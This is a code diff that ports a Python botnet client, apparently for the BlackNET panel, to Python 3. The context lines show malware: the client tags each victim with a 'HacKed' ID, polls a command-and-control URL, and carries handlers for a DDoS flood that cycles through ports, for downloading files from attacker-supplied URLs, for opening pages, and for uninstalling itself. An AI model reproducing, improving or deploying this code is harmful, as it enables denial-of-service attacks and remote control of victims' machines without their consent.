@@ -6,9 +6,12 @@ import platform
 import base64
 import time
 
-PanelURL = "http://EnterYourBlackNETPanelHost/blacknet/"
+PanelURL = "http://BlackNETPanelURL/blacknet/"
 cid = "HacKed"
-uid = cid + "_" + base64.b64encode(os.getlogin());
+username = os.getenv("USER")
+basecode =base64.urlsafe_b64encode(username.encode('UTF-8')).decode('ascii')
+uid = cid + "_" + basecode
+
 if os.name == "posix":
       oss = "GNU/LINUX"
 elif os.name == 'nt':
@@ -24,16 +27,16 @@ while (count == 0):
    splitcommand = commands.text.split("|BN|")
    time.sleep(10)
    if splitcommand[0] == '':
-      print ""
+      print ("")
    else:
       if splitcommand[0] == "PrintMessage":
          
               time.sleep(10)
-              print splitcommand[1]
+              print (splitcommand[1])
               time.sleep(10)
               requests.get(url = PanelURL + "receive.php", params = {'command': "CleanCommands",'VicID': uid})
       else:
-         print "";
+         print ("");
 
       if splitcommand[0] == "OpenPage":
                 time.sleep(10)
@@ -41,7 +44,7 @@ while (count == 0):
                 time.sleep(10)
                 requests.get(url = PanelURL + "receive.php", params = {'command': "CleanCommands",'VicID': uid})
       else:
-         print "";
+         print ("");
 
       if splitcommand[0] == "DDOSAttack":
                 port = 80;
@@ -52,7 +55,7 @@ while (count == 0):
                      if port == 65534:
                         port = 1
       else:
-         print "";
+         print ("");
          
       if splitcommand[0] == "UploadFile":
               file_url = splitcommand[1]
@@ -64,16 +67,16 @@ while (count == 0):
                    pass
                   requests.get(url = PanelURL + "receive.php", params = {'command': "CleanCommands",'VicID': uid})
       else:
-         print "";
+         print ("");
 
       if splitcommand[0] == "Uninstall":
                   requests.get(url = PanelURL + "receive.php", params = {'command': "Uninstall",'VicID': uid})
                   quit()
       else:
-         print "";
+         print ("");
 
       if splitcommand[0] == "Close":
                   quit()
       else:
-         print "";
+         print ("");
 pass
